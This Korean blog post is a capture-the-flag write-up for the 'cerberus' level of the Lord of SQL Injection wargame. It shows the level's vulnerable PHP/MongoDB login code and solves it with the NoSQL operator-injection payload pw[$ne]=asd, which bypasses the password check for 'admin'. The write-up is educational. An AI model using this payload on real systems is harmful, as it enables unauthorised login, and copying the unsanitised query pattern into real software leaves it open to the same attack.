---
title: "[Lord of SQL Injection] LoS - cerberus 문제풀이"
date: 2019-08-05
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

드디어 `MSSQL`이 끝나고 이번엔 `MongoDB`로 넘어왔다.
문제 이름은 `cerberus`이다.  

<!--more-->

코드는 다음과 같다.  

```php
---------------------------------
query : {"id":null,"pw":null}
---------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mongodb_connect();
  $query = array(
    "id" => $_GET['id'],
    "pw" => $_GET['pw']
  );
  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
  $result = mongodb_fetch_array($db->prob_cerberus->find($query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";
  if($result['id'] === "admin") solve("cerberus");
  highlight_file(__FILE__);
?>
```

코드는 간단하다.
`id`가 `admin`인 행을 추출하면 된다.
그래서 인터넷에 `mongodb sql injection`이라고 검색을 해 보았더니 자료가 엄청 많이 나왔다.
`MongoDB`는 `NoSQL`이라고 한단다.  

#### NoSQL  
> Not Only SQL로 불리기도 하며, SQL만을 사용하지 않은 DBMS  
> 비관계형 데이터베이스  
> 즉, 데이터의 관계를 정의하지 않고 사용하는 DB  

아래 블로그에서 NoSQL과 일반 SQL DB 사이의 차이점을 쉽게 설명 해 주었다.  

> [NOSQL Injection from MongoDB](https://tribal1012.tistory.com/138)

위의 블로그를 읽은 후, 문제의 소스코드를 보면 문제에서는 `find($query)`를 이용하여 `select * from prob_cerberus where id=$_GET['id'] and pw=$_GET['pw']` 형태의 쿼리를 실행했다는 것을 알 수 있었다.
그런데 이 때, Array 형태로 구성되어 있는 `$query` 안에 또 다시 관계를 나타내는 Array를 삽입 해 의도하지 않은 결과를 가져올 수 있다고 한다.
가장 자주 쓰이는 것이 `$ne`인 것 같은데, 이는 `!=`과 동일한 기능을 하는 문자이다.
따라서 해당 쿼리에서 `pw=$_GET['pw']` 부분을 `pw!=$_GET['pw']`로 만들어 `id`는 `admin`이지만, `pw`의 값이 내가 입력한 값이 아닌 데이터를 불러오도록 조작할 수 있다.
위의 블로그에서는 테스트 환경에서 소스코드를 짜서 구성했는데, 나는 그냥 배열 형태로 아래와 같이 넣어주었다.  

```plain
?id=admin&pw[$ne]=asd
```

그럼 완성되는 `$query`의 내용은 아래와 같을 것이다.  

```json
{"id" : "admin", "pw" : {"$ne":"asd"}}
```

즉, `SQL`의 `where 절`과 같이 바꾸어 보면 다음과 같다.  

```mysql
where id = "admin" and pw != "asd"
```

따라서 아래와 같이 문제를 풀 수 있게 된다.  

```php
----------------------------------------------------------
query : {"id":"admin","pw":{"$ne":"asd"}}
----------------------------------------------------------

Hello admin
CERBERUS Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mongodb_connect();
  $query = array(
    "id" => $_GET['id'],
    "pw" => $_GET['pw']
  );
  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
  $result = mongodb_fetch_array($db->prob_cerberus->find($query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";
  if($result['id'] === "admin") solve("cerberus");
  highlight_file(__FILE__);
?>
```

---

```plain
CERBERUS Clear!!
```